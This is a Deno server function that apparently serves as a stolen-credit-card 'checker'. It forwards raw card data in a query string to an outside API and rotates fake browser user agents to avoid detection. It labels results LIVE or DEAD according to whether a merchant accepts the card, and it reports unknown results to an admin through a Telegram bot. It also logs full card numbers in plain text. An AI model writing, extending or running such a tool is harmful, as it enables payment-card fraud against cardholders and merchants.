import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_CHAT_ID = "8496943061";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Multiple browser user agents for rotation
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
];

// Get random user agent
const getRandomUserAgent = (): string => {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
};

// Send debug message to admin via Telegram
const sendDebugToAdmin = async (card: string, response: unknown, isUnknown: boolean): Promise<void> => {
  if (!TELEGRAM_BOT_TOKEN || !isUnknown) return;
  
  try {
    const maskedCard = card.substring(0, 6) + '******' + card.substring(card.length - 4);
    const responseStr = typeof response === 'string' ? response : JSON.stringify(response, null, 2);
    
    const message = `⚠️ <b>UNKNOWN Card Response Debug</b>\n\n` +
      `<b>Card:</b> <code>${maskedCard}</code>\n\n` +
      `<b>Full API Response:</b>\n<pre>${responseStr.substring(0, 3500)}</pre>`;
    
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (err) {
    console.error('Failed to send debug to admin:', err);
  }
};

// Check if response should be classified as unknown
const isUnknownResponse = (data: Record<string, unknown>): boolean => {
  const message = (data?.message as string)?.toLowerCase() || '';
  
  // LIVE responses
  if (message.includes("payment method added successfully") || message.includes("card added successfully")) {
    return false;
  }
  
  // DEAD responses
  if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
    return false;
  }
  
  // Everything else is UNKNOWN
  return true;
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ error: 'Card data (cc) is required' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const userAgent = getRandomUserAgent();
    console.log('Checking card:', cc);
    console.log('Using User-Agent:', userAgent);

    // Call the external API with the raw card format (no URL encoding for pipes)
    const apiUrl = `http://web-production-a3b94.up.railway.app/api?cc=${cc}`;
    console.log('Calling API:', apiUrl);

    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
      }
    });
    const rawText = await response.text();
    console.log('Raw API response:', rawText);

    // Try to parse as JSON
    let data: Record<string, unknown>;
    try {
      data = JSON.parse(rawText);
    } catch {
      // If not JSON, return raw text
      data = { raw: rawText, status: "ERROR" };
    }

    console.log('Parsed response:', data);

    // Send debug to admin if response is UNKNOWN
    const isUnknown = isUnknownResponse(data);
    if (isUnknown) {
      console.log('UNKNOWN response detected, sending debug to admin');
      await sendDebugToAdmin(cc, data, true);
    }

    return new Response(
      JSON.stringify(data),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('Error:', errorMessage);
    
    // Send error debug to admin
    await sendDebugToAdmin('unknown', { error: errorMessage }, true);
    
    return new Response(
      JSON.stringify({ error: errorMessage, status: "ERROR" }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
